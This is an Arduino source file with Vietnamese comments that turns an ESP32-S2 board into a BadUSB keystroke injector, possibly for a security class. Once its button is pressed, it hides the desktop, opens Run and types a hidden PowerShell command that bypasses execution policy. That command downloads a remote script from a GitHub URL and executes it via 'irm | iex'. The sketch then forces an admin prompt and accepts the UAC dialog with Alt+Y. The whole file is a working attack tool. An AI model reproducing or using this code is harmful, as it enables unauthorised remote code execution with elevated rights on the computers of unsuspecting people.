#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

const int buttonPin = 0; // Nút BOOT trên mạch Lolin S2 Mini
const int ledPin = 15;   // Đèn LED tích hợp trên mạch Lolin S2 Mini (thường là chân 15)

void setup() {
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW); // Tắt LED ban đầu

  // Khởi động cổng Serial để ghi log (Tốc độ baud: 115200)
  Serial.begin(115200);
  
  // Khởi động Bàn phím ảo
  Keyboard.begin();
  USB.begin();

  // Đợi một chút để cổng Serial ổn định
  delay(2000);
  Serial.println("\n--- HỆ THỐNG BADUSB ĐÃ SẴN SÀNG ---");
  Serial.println("[LOG] Chờ nhấn nút BOOT để bắt đầu tấn công...");
}

void loop() {
  if (digitalRead(buttonPin) == LOW) {
    delay(200); // Chống rung phím
    digitalWrite(ledPin, HIGH); // Bật LED báo hiệu đang chạy

    Serial.println("\n[LOG] BẮT ĐẦU CHUỖI THỰC THI PAYLOAD!");

    // ==========================================
    // BƯỚC 1: ẨN CỬA SỔ
    // ==========================================
    Serial.println("[LOG] Bước 1/6: Đang thu nhỏ các cửa sổ (Win + D)...");
    delay(2500); 
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('d');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    // ==========================================
    // BƯỚC 2: MỞ HỘP THOẠI RUN
    // ==========================================
    Serial.println("[LOG] Bước 2/6: Đang mở hộp thoại Run (Win + R)...");
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(50);
    Keyboard.releaseAll();
    delay(200);

    // ==========================================
    // BƯỚC 3: GÕ LỆNH POWERSHELL
    // ==========================================
    Serial.println("[LOG] Bước 3/6: Đang nhập mã độc PowerShell...");
    // Nhớ thay <LINK> bằng đường dẫn tải file ps.ps1 của bạn
    // Đã thay đổi: Dùng -w h để cửa sổ bốc hơi ngay lập tức khi vừa mở lên
    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/MinhNhat/src/ps.ps1 | iex\"");
    delay(200);

 


    // ==========================================
    // BƯỚC 4: KÍCH HOẠT QUYỀN ADMIN
    // ==========================================
    Serial.println("[LOG] Bước 4/6: Đang nhấn Ctrl+Shift+Enter để gọi quyền Admin...");
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // ==========================================
    // BƯỚC 5: VƯỢT QUA UAC
    // ==========================================
    Serial.println("[LOG] Bước 5/6: Đang chờ bảng UAC hiện lên (Đợi 2.5s)...");
    delay(2500); 
    
    Serial.println("[LOG] Bước 5/6: Đang nhấn ALT + Y để vượt qua UAC...");
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('y');
    delay(100);
    Keyboard.releaseAll();
    
    // ==========================================
    // BƯỚC 6: BÁO HIỆU HOÀN TẤT
    // ==========================================
    Serial.println("[LOG] Bước 6/6: Kịch bản đã gõ xong! Chờ file tải về (Nháy Caps Lock)...");
    
    for(int i = 0; i < 4; i++) {
      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
      delay(250); 
      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
      delay(250); 
    }
    //nháy liên tục đèn trên esp
    while(true) {
      digitalWrite(ledPin, HIGH);
      delay(250);
      digitalWrite(ledPin, LOW);
      delay(250);
    }
    while(digitalRead(buttonPin) == LOW) delay(10);
  }
}